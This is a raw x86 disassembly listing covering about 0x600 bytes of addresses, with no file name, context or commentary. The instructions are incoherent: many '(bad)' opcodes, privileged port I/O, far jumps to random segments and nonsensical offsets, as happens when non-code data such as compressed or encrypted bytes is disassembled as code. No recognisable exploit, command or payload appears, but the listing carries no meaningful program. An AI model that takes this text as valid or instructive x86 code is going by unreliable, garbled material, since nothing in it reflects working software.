  427e51:	lahf   
  427e52:	into   
  427e53:	cmp    al,0xf8
  427e55:	cmp    bh,BYTE PTR [esi]
  427e57:	adc    ecx,esi
  427e59:	repnz xchg ebp,eax
  427e5b:	ss and al,0xae
  427e5e:	inc    edi
  427e5f:	pop    es
  427e60:	mov    BYTE PTR [esi-0x54683098],dl
  427e66:	(bad)  
  427e67:	dec    esi
  427e68:	sub    BYTE PTR gs:[edi-0x4e65680d],ah
  427e6f:	mov    es,WORD PTR [ecx-0x74c2b5fa]
  427e75:	jmp    0x1d6c7a6b
  427e7a:	out    0x3e,eax
  427e7c:	mov    DWORD PTR [edx-0x16],ebp
  427e7f:	call   0x69208473
  427e84:	mov    esp,0x14155a5d
  427e89:	icebp  
  427e8a:	bound  edx,QWORD PTR [esi+0x4a]
  427e8d:	or     BYTE PTR [eax-0x649f5f88],bh
  427e93:	adc    BYTE PTR [ebx-0x35],al
  427e96:	clc    
  427e97:	in     al,0x1e
  427e99:	or     esp,esi
  427e9b:	ror    BYTE PTR ds:0x38a80d9d,1
  427ea1:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  427ea3:	sub    ebp,ebx
  427ea5:	cmp    ah,BYTE PTR [ecx]
  427ea7:	shl    ch,1
  427ea9:	retf   
  427eaa:	sbb    BYTE PTR [ebp+0x50],0x53
  427eae:	jmp    0x3d2783dc
  427eb3:	clc    
  427eb4:	add    BYTE PTR [ecx+esi*4+0x1c],0xbe
  427eb9:	pop    ebx
  427eba:	jge    0x427f05
  427ebc:	fxch   st(7)
  427ebe:	leave  
  427ebf:	push   ebp
  427ec0:	inc    edx
  427ec1:	xor    edi,esi
  427ec3:	adc    bh,BYTE PTR [eax+0x1b]
  427ec6:	cmp    DWORD PTR [esi],edx
  427ec8:	sub    edx,DWORD PTR [esi-0x21]
  427ecb:	fnstsw WORD PTR ds:0x69bfa156
  427ed1:	loop   0x427ed0
  427ed3:	xor    DWORD PTR [eax],eax
  427ed5:	and    DWORD PTR [ebx-0x4e],ebx
  427ed8:	ss lock pop ss
  427edb:	dec    ecx
  427edc:	loop   0x427e75
  427ede:	mov    al,0x51
  427ee0:	mov    bl,0xcd
  427ee2:	mov    al,ss:0xba08ca7
  427ee8:	test   eax,0xf33c47b9
  427eed:	arpl   WORD PTR [ecx+0x13],di
  427ef0:	fst    DWORD PTR [esi-0x34]
  427ef3:	mov    esp,0x99fe58da
  427ef8:	in     eax,0x3f
  427efa:	and    dh,BYTE PTR [esi-0x4a]
  427efd:	adc    ebx,edi
  427eff:	cmp    ch,BYTE PTR es:[ebx+0x73]
  427f03:	loope  0x427f7c
  427f05:	dec    esi
  427f06:	xor    eax,0x40284919
  427f0b:	cmp    eax,0xcba039
	...
  427f18:	add    BYTE PTR [eax],al
  427f1a:	call   0xdafe:0xfef82244
  427f21:	leavew 
  427f23:	and    dh,BYTE PTR [ecx+edx*1-0x5d]
  427f27:	jecxz  0x427ee2
  427f29:	mov    ch,0x5d
  427f2b:	hlt    
  427f2c:	add    DWORD PTR [eax],eax
  427f2e:	std    
  427f2f:	add    DWORD PTR [eax],eax
  427f31:	add    BYTE PTR [ebp+0x2799db62],dl
  427f37:	pop    ebx
  427f38:	adc    ebp,DWORD PTR [edi-0x3c]
  427f3b:	push   edx
  427f3c:	xchg   ebx,eax
  427f3d:	in     al,0x3b
  427f3f:	pop    esp
  427f40:	fdivrp st(3),st
  427f42:	test   eax,0xb2d68849
  427f47:	or     ebx,DWORD PTR [eax+0x58e06075]
  427f4d:	outs   dx,BYTE PTR ds:[esi]
  427f4e:	push   eax
  427f4f:	out    dx,al
  427f50:	mul    DWORD PTR [edi+0xa]
  427f53:	mov    ds:0xd2c0018b,eax
  427f58:	add    eax,0x3fa3ac3
  427f5d:	xchg   esi,eax
  427f5e:	sbb    al,0xae
  427f60:	inc    ebx
  427f61:	retf   0xf207
  427f64:	mov    dl,0xb1
  427f66:	div    BYTE PTR [edi+0x1d7889f2]
  427f6c:	out    dx,eax
  427f6d:	jmp    0x55a46b20
  427f72:	into   
  427f73:	jnp    0x427f3b
  427f75:	int    0x6
  427f77:	jl     0x427f69
  427f79:	mov    ds,eax
  427f7b:	popa   
  427f7c:	xchg   ah,cl
  427f7e:	push   edx
  427f7f:	adc    al,BYTE PTR [edi-0x16]
  427f82:	add    al,BYTE PTR [ecx]
  427f84:	dec    esi
  427f85:	test   DWORD PTR [ebp-0x3ab72dd7],esi
  427f8b:	stos   DWORD PTR es:[edi],eax
  427f8c:	or     ch,ah
  427f8e:	jmp    0xa9f9b610
  427f93:	sub    dl,BYTE PTR [ecx]
  427f95:	dec    edi
  427f96:	fwait
  427f97:	adc    DWORD PTR [edi+edi*2+0x7e],edi
  427f9b:	push   esp
  427f9c:	iret   
  427f9d:	dec    ecx
  427f9e:	rcr    ah,1
  427fa0:	cld    
  427fa1:	ins    BYTE PTR es:[edi],dx
  427fa2:	adc    al,dl
  427fa4:	jmp    0xe0de:0xe90dc255
  427fab:	push   fs
  427fad:	sahf   
  427fae:	inc    ecx
  427faf:	mov    DWORD PTR [edx],ebp
  427fb1:	mov    esi,DWORD PTR [esi-0x24ac216b]
  427fb7:	cmp    BYTE PTR [esi-0x3901b7bf],bh
  427fbd:	adc    bh,BYTE PTR [ecx]
  427fbf:	push   0xffffffce
  427fc1:	stos   BYTE PTR es:[edi],al
  427fc2:	jne    0x427fef
  427fc4:	stos   BYTE PTR es:[edi],al
  427fc5:	in     al,0x70
  427fc7:	ja     0x42802b
  427fc9:	jmp    0x4ff5:0xde222341
  427fd0:	jecxz  0x427f5e
  427fd2:	js     0x427faa
  427fd4:	jns    0x427f61
  427fd6:	ds xchg esi,eax
  427fd8:	pop    ebx
  427fd9:	jo     0x427f6a
  427fdb:	fild   DWORD PTR [esi+0x2161157d]
  427fe1:	loope  0x427f8d
  427fe3:	(bad)
  427fe7:	in     eax,dx
  427fe8:	dec    ecx
  427fe9:	js     0x427fa9
  427feb:	test   al,0x38
  427fed:	inc    eax
  427fee:	sahf   
  427fef:	fdiv   QWORD PTR [esi]
  427ff1:	into   
  427ff2:	sub    BYTE PTR [esi-0x4411c8d2],cl
  427ff8:	inc    esp
  427ff9:	fbld   TBYTE PTR [esi]
  427ffb:	ds push cs
  427ffd:	adc    eax,0x5d04abf
  428002:	inc    eax
  428003:	mov    cl,0x5b
  428005:	pop    ecx
  428006:	adc    eax,0x19a8dac0
  42800b:	js     0x427fe2
  42800d:	sti    
  42800e:	inc    esi
  42800f:	ret    
  428010:	fdivr  DWORD PTR [ebp+0x5c138a69]
  428016:	aam    0xd0
  428018:	dec    edx
  428019:	lods   eax,DWORD PTR ds:[esi]
  42801a:	mov    bl,0x7
  42801c:	or     BYTE PTR [eax+0x46c12492],bl
  428022:	js     0x427fdd
  428024:	push   edi
  428025:	sub    esp,DWORD PTR [esi+0x3190541c]
  42802b:	cmp    eax,0xc88e4c5b
  428030:	inc    ecx
  428031:	mov    edi,0xf37b0b6a
  428036:	dec    eax
  428037:	cdq    
  428038:	cmp    DWORD PTR [ebx-0x28],0xa16f03e9
  42803f:	daa    
  428040:	cs push edi
  428042:	dec    ebp
  428043:	jne    0x428096
  428045:	call   0x12e84b35
  42804a:	int    0x3a
  42804c:	push   ss
  42804d:	(bad)  
  42804f:	add    ecx,DWORD PTR es:[esi]
  428052:	sbb    BYTE PTR [eax+0x32],dl
  428055:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428056:	les    edx,FWORD PTR [edi+eax*4+0x36]
  42805a:	inc    esp
  42805b:	mov    bh,0xeb
  42805d:	loopne 0x42803e
  42805f:	rcr    BYTE PTR [ebp+esi*8+0x59],cl
  428063:	or     al,0x15
  428065:	fwait
  428066:	jl     0x428005
  428068:	call   0x2f31ea6e
  42806d:	arpl   WORD PTR [edi+0x75],di
  428070:	popa   
  428071:	mov    esp,0x976fc719
  428076:	pop    es
  428077:	sar    ah,1
  428079:	jmp    0x428008
  42807b:	imul   eax,ebx,0x855cdc2c
  428081:	sbb    al,0x33
  428083:	sub    bl,BYTE PTR [edx-0x41]
  428086:	jmp    0x37219460
  42808b:	lods   eax,DWORD PTR ds:[esi]
  42808c:	xchg   esi,eax
  42808d:	out    dx,eax
  42808e:	lea    ecx,[edi-0x52]
  428091:	test   BYTE PTR [ebp+ebx*4-0x7c],dh
  428095:	das    
  428096:	jb     0x4280ef
  428098:	xchg   ecx,eax
  428099:	mov    WORD PTR [ebp+0x1b],fs
  42809c:	mov    ecx,0x5138730d
  4280a1:	jp     0x4280c4
  4280a3:	and    eax,ecx
  4280a5:	scas   eax,DWORD PTR es:[edi]
  4280a6:	add    al,BYTE PTR [edx]
  4280a8:	sti    
  4280a9:	xchg   ebp,eax
  4280aa:	ror    BYTE PTR [edi+0x150373bc],0xa6
  4280b1:	push   ebx
  4280b2:	push   edi
  4280b3:	and    BYTE PTR ds:0x577a2271,dh
  4280b9:	cmc    
  4280ba:	or     BYTE PTR [ecx-0x67],al
  4280bd:	test   BYTE PTR [edi-0x68],cl
  4280c0:	call   0xd591:0xe0eea5c2
  4280c7:	cs test eax,0xcbe0ea66
  4280cd:	mov    cl,0x16
  4280d0:	pop    edi
  4280d1:	clc    
  4280d2:	sti    
  4280d3:	xor    ch,BYTE PTR [esi]
  4280d5:	mov    al,ds:0xc4d7b455
  4280da:	xchg   ebx,eax
  4280db:	dec    eax
  4280dc:	mov    edi,0x88eaa1b3
  4280e1:	cmc    
  4280e2:	jo     0x42812d
  4280e4:	es cmp al,0x97
  4280e7:	and    eax,DWORD PTR ds:0x9084f1f9
  4280ed:	lea    eax,[edx+ebp*1-0x8]
  4280f1:	jno    0x42807b
  4280f3:	cmp    DWORD PTR [ecx+0x46d1945f],ebp
  4280f9:	mov    ch,BYTE PTR [esp+ebx*2-0x57]
  4280fd:	xor    cl,BYTE PTR [edi+0x36]
  428100:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428101:	dec    ebx
  428102:	sub    edi,DWORD PTR [edx-0x7f]
  428105:	sub    ebp,DWORD PTR [esi]
  428107:	and    DWORD PTR ds:0x8058f688,esp
  42810d:	adc    BYTE PTR [edx-0x225d2e0d],bl
  428113:	aas    
  428114:	inc    eax
  428115:	pop    edx
  428116:	jl     0x42810b
  428118:	hlt    
  428119:	cmp    bl,ch
  42811b:	mov    WORD PTR [ebx-0x3be1cd58],fs
  428121:	rol    DWORD PTR [edi*2-0x1b92cf33],0xd3
  428129:	adc    esp,0xc2959474
	...
  428137:	add    BYTE PTR [eax],al
  428139:	add    BYTE PTR [eax+0x3fc326ab],dl
  42813f:	iret   
  428140:	cmc    
  428141:	sti    
  428142:	pushf  
  428143:	and    al,0x28
  428145:	push   ebp
  428146:	jp     0x4280d4
  428148:	jae    0x4281c5
  42814a:	pop    edx
  42814b:	test   BYTE PTR [ecx],0x0
  42814e:	std    
  42814f:	add    DWORD PTR [eax],eax
  428151:	add    al,cl
  428153:	pop    es
  428154:	xchg   ebx,eax
  428155:	push   edi
  428156:	pushf  
  428157:	jae    0x428135
  428159:	clc    
  42815a:	mov    BYTE PTR [ecx+0x71],bh
  42815d:	push   cs
  42815e:	imul   edx,DWORD PTR [esi],0x3b5c5219
  428164:	jmp    0x4281b7
  428166:	ror    BYTE PTR [esi-0x27e4ca3e],cl
  42816c:	mov    ds:0x4fa4a108,eax
  428171:	rcr    BYTE PTR [eax-0x2],0xbb
  428175:	into   
  428176:	cmc    
  428177:	mov    esp,edi
  428179:	loope  0x4281a7
  42817b:	jae    0x428128
  42817d:	pop    es
  42817e:	xor    ecx,DWORD PTR [edi+0x76]
  428181:	cmp    DWORD PTR [esi+0x3bca330b],edx
  428187:	ficomp WORD PTR [eax+0x10]
  42818a:	shl    dl,0x92
  42818d:	cmp    DWORD PTR [ebp+0x3509c59c],esi
  428193:	sbb    eax,0x9ffdf0ef
  428198:	shr    BYTE PTR [ecx+edi*2],1
  42819b:	ficom  WORD PTR cs:[edi]
  42819e:	adc    eax,0x89fcdb74
  4281a3:	push   edx
  4281a4:	rol    DWORD PTR [ebx+0x2],1
  4281a7:	mov    ebx,DWORD PTR [edx+0x2c]
  4281aa:	mov    dh,0x16
  4281ac:	or     ch,ah
  4281ae:	hlt    
  4281af:	popf   
  4281b0:	stos   DWORD PTR es:[edi],eax
  4281b1:	(bad)  
  4281b2:	dec    ebp
  4281b3:	cmp    edi,edx
  4281b5:	ret    0x3a5c
  4281b8:	sbb    eax,0x25884c03
  4281bd:	cmp    al,0x13
  4281bf:	add    eax,0xca369fb5
  4281c4:	pushf  
  4281c5:	xchg   ebp,eax
  4281c6:	xor    eax,esp
  4281c8:	call   0xb45455c4
  4281cd:	sbb    BYTE PTR [ebx],dl
  4281cf:	lods   al,BYTE PTR ds:[esi]
  4281d0:	adc    edi,DWORD PTR [edx+esi*1-0x3cbe10a9]
  4281d7:	out    dx,eax
  4281d8:	cs leave 
  4281da:	sub    esp,DWORD PTR [ebx-0x79]
  4281dd:	cmovnp ebp,DWORD PTR [esi+0x7ec7cb20]
  4281e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4281e5:	cmp    dl,bh
  4281e7:	and    eax,0xf7a80bca
  4281ec:	cmc    
  4281ed:	inc    esp
  4281ee:	pop    ecx
  4281ef:	not    BYTE PTR [edx+ebp*8-0x5db15023]
  4281f6:	inc    ebp
  4281f7:	adc    cl,BYTE PTR [edx]
  4281f9:	mov    dh,0x1b
  4281fb:	add    BYTE PTR [eax-0x53],al
  4281fe:	(bad)  
  4281ff:	xlat   BYTE PTR ds:[ebx]
  428200:	fs push esp
  428202:	push   ebx
  428203:	mov    ebp,DWORD PTR [ebp+0x4da98b29]
  428209:	adc    ebp,DWORD PTR [edi]
  42820b:	retf   0x8248
  42820e:	sub    eax,DWORD PTR [esi-0x2b376fbc]
  428214:	add    dl,ch
  428216:	mov    gs,WORD PTR [ebp-0x2c20ac3b]
  42821c:	and    BYTE PTR es:[esi+0x44],0x85
  428221:	stos   DWORD PTR es:[edi],eax
  428222:	data16 es add al,0xbd
  428226:	pop    esi
  428227:	mov    bh,0xae
  428229:	xor    BYTE PTR [esi],bl
  42822b:	push   edx
  42822c:	push   eax
  42822d:	outs   dx,BYTE PTR ds:[esi]
  42822e:	int    0x80
  428230:	mov    esi,0x66fb0575
  428235:	inc    eax
  428236:	push   ebp
  428237:	retw   0xdbe8
  42823b:	(bad)  
  42823c:	fsubr  DWORD PTR [ebx-0x65dfcca5]
  428242:	xor    DWORD PTR ds:0x444d3cb6,0x4c500d37
  42824c:	mov    edx,esi
  42824e:	mov    bh,0x8d
  428250:	pushf  
  428251:	xlat   BYTE PTR ds:[ebx]
  428252:	inc    esp
  428253:	add    al,0x6d
  428255:	int3   
  428256:	mov    al,0x4c
  428258:	pop    edx
  428259:	pop    ebx
  42825a:	nop
  42825b:	js     0x4282ac
  42825d:	dec    ebp
  42825e:	xchg   edx,eax
  42825f:	pop    ss
  428260:	enter  0xc249,0x0
  428264:	push   ss
  428265:	icebp  
  428266:	or     eax,DWORD PTR [ebx]
  428268:	test   DWORD PTR [ebx-0x2fe318a5],esi
  42826e:	push   eax
  42826f:	xchg   edx,eax
  428270:	jae    0x4281f5
  428272:	push   esp
  428273:	adc    eax,0x70c7d76e
  428278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428279:	stc    
  42827a:	lods   al,BYTE PTR ds:[esi]
  42827b:	adc    edi,ebp
  42827d:	dec    ebx
  42827e:	jo     0x428218
  428280:	and    al,ch
  428282:	pop    esp
  428283:	sti    
  428284:	fwait
  428285:	dec    esi
  428286:	mov    ds:0xe68fee6d,al
  42828b:	pop    edx
  42828c:	rcl    BYTE PTR [eax+0x7a],0xcc
  428290:	in     eax,0x41
  428292:	and    dh,BYTE PTR [esi+0x4ad2191d]
  428298:	or     ch,BYTE PTR [esi+0x39]
  42829b:	out    dx,al
  42829c:	lock mov ah,0x1b
  42829f:	mov    ch,0xf7
  4282a1:	sbb    cl,BYTE PTR [ecx-0x70]
  4282a4:	sbb    DWORD PTR [edi],ebp
  4282a6:	lods   eax,DWORD PTR ds:[esi]
  4282a7:	and    DWORD PTR [edi+0x2b],ecx
  4282aa:	out    dx,al
  4282ab:	lods   al,BYTE PTR ds:[esi]
  4282ac:	fwait
  4282ad:	cmp    eax,0xe644f398
  4282b2:	js     0x4282a2
  4282b4:	pop    ebp
  4282b5:	sub    DWORD PTR [ebx-0x50053297],ebp
  4282bb:	aaa    
  4282bc:	or     DWORD PTR [esi-0x47fde5c2],0x2f19f5b7
  4282c6:	sub    al,0xfd
  4282c8:	sbb    ch,BYTE PTR [ecx+0x5daa32c4]
  4282ce:	ins    DWORD PTR es:[edi],dx
  4282cf:	je     0x42826b
  4282d1:	inc    edx
  4282d2:	dec    esp
  4282d3:	or     bh,al
  4282d5:	inc    eax
  4282d6:	pusha  
  4282d7:	mov    eax,ds:0xc0f0110b
  4282dc:	icebp  
  4282dd:	sbb    eax,DWORD PTR [edi-0x66]
  4282e0:	out    dx,eax
  4282e1:	rcr    esi,0x8a
  4282e4:	and    DWORD PTR [eax-0x7b824afa],0xd34a4804
  4282ee:	je     0x428310
  4282f0:	mov    bl,0xcc
  4282f2:	test   DWORD PTR [eax+0x13],edi
  4282f5:	enter  0x5fef,0x26
  4282f9:	clc    
  4282fa:	sbb    al,0x59
  4282fc:	sub    eax,0xa650ff99
  428301:	out    dx,eax
  428302:	sub    al,0x73
  428304:	inc    ecx
  428305:	aaa    
  428306:	cmp    edi,0x2a435285
  42830c:	xchg   ebx,eax
  42830d:	push   eax
  42830e:	cmp    eax,0x44c34041
  428313:	mov    ds:0x6daba483,eax
  428318:	mov    ch,0xce
  42831a:	cmp    al,0xb2
  42831c:	mov    eax,ds:0xc1ed969e
  428321:	and    al,BYTE PTR [ebx-0x6c8840b8]
  428327:	mov    ebp,0xa59e8762
  42832c:	pop    ebp
  42832d:	lock adc esi,esp
  428330:	jl     0x428365
  428332:	fs jne 0x4282f1
  428335:	sub    DWORD PTR [edx+ebp*8-0x2e2807ee],edx
  42833c:	or     eax,DWORD PTR [eax-0x17]
  42833f:	sbb    eax,0x8784fe83
  428344:	test   esp,eax
  428346:	(bad)  
  428347:	stc    
  428348:	adc    al,BYTE PTR [esi+0x5a]
  42834b:	sbb    DWORD PTR [eax+0x47],esp
  42834e:	nop
	...
  428357:	add    BYTE PTR [eax],al
  428359:	add    ch,bh
  42835b:	cmp    DWORD PTR ds:0xfd1cf514,esi
  428361:	stc    
  428362:	jl     0x428396
  428364:	stc    
  428365:	jne    0x428351
  428367:	push   eax
  428368:	sbb    al,0x27
  42836a:	push   edi
  42836b:	clc    
  42836c:	add    DWORD PTR [eax],eax
  42836e:	out    dx,eax
  42836f:	add    DWORD PTR [eax],eax
  428371:	add    BYTE PTR [esp],ah
  428374:	stos   DWORD PTR es:[edi],eax
  428375:	pushf  
  428376:	in     eax,dx
  428377:	sahf   
  428378:	mov    ecx,0xf2d5c940
  42837d:	or     ebp,DWORD PTR [ecx+0x54a8ef87]
  428383:	ror    BYTE PTR [ecx-0x5a],cl
  428386:	imul   esp,DWORD PTR [eax],0xc2561f5c
  42838c:	xor    BYTE PTR [eax],0x83
  42838f:	bound  ebp,QWORD PTR [edi+ebx*1+0x22a51382]
  428396:	dec    esi
  428397:	imul   DWORD PTR [ecx+ecx*8+0x2c]
  42839b:	sub    DWORD PTR [esi+0x64375286],0x1c5201cf
  4283a5:	sub    ah,BYTE PTR [ebx]
  4283a7:	pop    edx
  4283a8:	js     0x4283b1
  4283aa:	lods   al,BYTE PTR ds:[esi]
  4283ab:	data16 std 
  4283ad:	lds    edx,FWORD PTR [edi-0x4ad86e40]
  4283b3:	jne    0x42839d
  4283b5:	xchg   esi,eax
  4283b6:	outs   dx,BYTE PTR ds:[esi]
  4283b7:	sbb    BYTE PTR [ebx+eax*8],0x5c
  4283bb:	lds    eax,FWORD PTR [ebx-0x55]
  4283be:	mov    cl,0xc4
  4283c0:	push   esi
  4283c1:	js     0x42837c
  4283c3:	xchg   edx,eax
  4283c4:	jns    0x42839a
  4283c6:	adc    BYTE PTR [ebp+0x75],bh
  4283c9:	push   esp
  4283ca:	adc    DWORD PTR [edi],0xffffffdc
  4283cd:	scas   eax,DWORD PTR es:[edi]
  4283ce:	or     eax,0x9868391c
  4283d3:	outs   dx,BYTE PTR ds:[esi]
  4283d4:	retf   0x8b44
  4283d7:	int    0x8f
  4283d9:	xor    DWORD PTR [eax+0xfbbcd8a],edi
  4283df:	mov    WORD PTR [edx-0x3c],?
  4283e2:	mov    esp,0xadc6cc4e
  4283e7:	and    DWORD PTR ds:0xed8d1b15,esp
  4283ed:	push   ebp
  4283ee:	outs   dx,DWORD PTR ds:[esi]
  4283ef:	adc    DWORD PTR [esi+0x786054ef],esi
  4283f5:	push   ebp
  4283f6:	xchg   edx,eax
  4283f7:	xchg   DWORD PTR [ebx+ecx*1+0x38647e1d],eax
  4283fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4283ff:	hlt    
  428400:	cmp    BYTE PTR [esi+0x33],0x4f
  428404:	stc    
  428405:	pop    edi
  428406:	lea    esp,[edx+0x72]
  428409:	xchg   BYTE PTR [edx],cl
  42840b:	inc    eax
  42840c:	inc    esp
  42840d:	leave  
  42840e:	push   es
  42840f:	loope  0x4283b2
  428411:	ret    0x38ea
  428414:	cmc    
  428415:	jecxz  0x42845b
  428417:	lods   al,BYTE PTR ds:[esi]
  428418:	test   al,0xd7
  42841a:	das    
  42841b:	and    DWORD PTR [edx+edx*2],0xffffffcb
  42841f:	popf   
  428420:	adc    DWORD PTR ds:0x9a9c3e76,ecx
  428426:	push   ebp
  428427:	stc    
  428428:	std    
  428429:	cmp    al,0xd4
  42842b:	and    eax,0xdf14cee8
  428430:	push   ds
  428431:	dec    ebp
  428432:	and    al,0x76
  428434:	add    DWORD PTR [edi+0x48],0x49064caa
  42843b:	mov    al,0xe
  42843d:	xchg   BYTE PTR [esi+eax*8-0x62412ea3],dl
  428444:	pop    es
  428445:	imul   ecx,DWORD PTR [esi],0xffffffda
  428448:	repz or ah,BYTE PTR [edi]
  42844b:	pop    edx
  42844c:	mov    al,0x85
  42844e:	(bad)  
  42844f:	push   esp
  428450:	retf   0x9d2d
  428453:	dec    ebx
  428454:	jp     0x42849b
  428456:	sahf   
  428457:	imul   edx,DWORD PTR [ecx-0x19],0x3b7dac07
  42845e:	dec    edx
  42845f:	dec    esp
  428460:	pop    ss
  428461:	(bad)  [ebp+0x7e]
  428464:	pop    esp
  428465:	int3   
  428466:	mov    al,0xde
  428468:	jg     0x428446
  42846a:	arpl   WORD PTR [esp+eiz*2+0x25d97341],bp
  428471:	das    
  428472:	retf   0x69c6
  428475:	xchg   ebp,eax
  428476:	(bad)  [ebp+0x2086c5d9]
  42847c:	xor    al,0x40
  42847e:	(bad)  
  42847f:	mov    ah,0xd
  428481:	mov    esp,DWORD PTR [eax]
  428483:	dec    ebp
  428484:	mul    DWORD PTR [ecx]
  428486:	pusha  
  428487:	mov    cl,0x1b
  428489:	or     BYTE PTR [ecx+0x3f1fd8eb],dl
  42848f:	and    DWORD PTR [ebx],ebx
  428491:	mov    eax,0x880edd6b
  428496:	fsub   QWORD PTR [ecx-0x571057f]
  42849c:	out    dx,eax
  42849d:	aad    0xb9
  42849f:	shl    BYTE PTR [ebx-0x75],1
  4284a2:	aas    
  4284a3:	push   eax
  4284a4:	mov    bh,0xdc
  4284a6:	adc    eax,0xaedc0cb0
  4284ab:	mov    esp,cs
  4284ad:	cmc    
  4284ae:	inc    DWORD PTR [ecx-0x35]
  4284b1:	mov    ebp,0xd5e2d558
  4284b6:	jg     0x4284ab
  4284b8:	aam    0xc
  4284ba:	add    eax,0x5531dfd7
  4284bf:	retf   0xd8e3
  4284c2:	imul   esp,ebp,0xf5d14768
  4284c8:	fcmovne st,st(0)
  4284ca:	jg     0x4284e6
  4284cc:	repnz aad 0xbd
  4284cf:	mov    ds:0xb09654b4,al
  4284d4:	mov    dl,BYTE PTR [ecx]
  4284d6:	mov    edx,DWORD PTR [edi+0x7b]
  4284d9:	call   FWORD PTR [ebp+0x2]
  4284dc:	in     eax,0x92
  4284de:	sub    BYTE PTR [esi+0x193c8ed4],0x68
  4284e5:	mov    cl,0xca
  4284e7:	repz cmc 
  4284e9:	mul    DWORD PTR [edx]
  4284eb:	add    DWORD PTR [edi-0x38],esi
  4284ee:	stos   BYTE PTR es:[edi],al
  4284ef:	xchg   edi,eax
  4284f0:	pop    esi
  4284f1:	or     DWORD PTR [edi+0x41],0xffffff9e
  4284f5:	add    al,0xfe
  4284f7:	dec    ecx
  4284f8:	dec    DWORD PTR [eax]
  4284fa:	and    bl,BYTE PTR [ebp+0x48e1b472]
  428500:	lock and eax,0x45c29a3d
  428506:	fs xchg edx,eax
  428508:	pop    edx
  428509:	xor    DWORD PTR [edi],esi
  42850b:	sub    al,0x36
  42850d:	add    DWORD PTR [esp+eiz*2],esp
  428510:	pop    esp
  428511:	cwde   
  428512:	jne    0x428499
  428514:	pop    ebp
  428515:	add    edi,DWORD PTR [edi+0x449f90bd]
  42851b:	xor    DWORD PTR [esi+0x1a43fc9d],eax
  428521:	iret   
  428522:	push   edx
  428523:	pop    edx
  428524:	js     0x4284c3
  428526:	out    0x4c,eax
  428528:	mov    esi,0x47b51fd2
  42852d:	nop
  42852e:	aaa    
  42852f:	jecxz  0x42855d
  428531:	daa    
  428532:	jge    0x4284b6
  428534:	stos   DWORD PTR es:[edi],eax
  428535:	and    edi,ebp
  428537:	sbb    eax,0x9457e028
  42853c:	push   ss
  42853d:	push   ss
  42853e:	icebp  
  42853f:	jg     0x4284e7
  428541:	out    dx,al
  428542:	jae    0x42852f
  428544:	sahf   
  428545:	sbb    eax,0x98b7f4b9
  42854a:	or     BYTE PTR ds:0xa1895828,bl
  428550:	push   ss
  428551:	gs mov ecx,0x2eeab4a8
  428557:	jno    0x428595
  428559:	xor    eax,0xfe20d692
  42855e:	jmp    0x0:0x605
  428565:	add    BYTE PTR [eax],al
  428567:	add    BYTE PTR [eax],al
	...
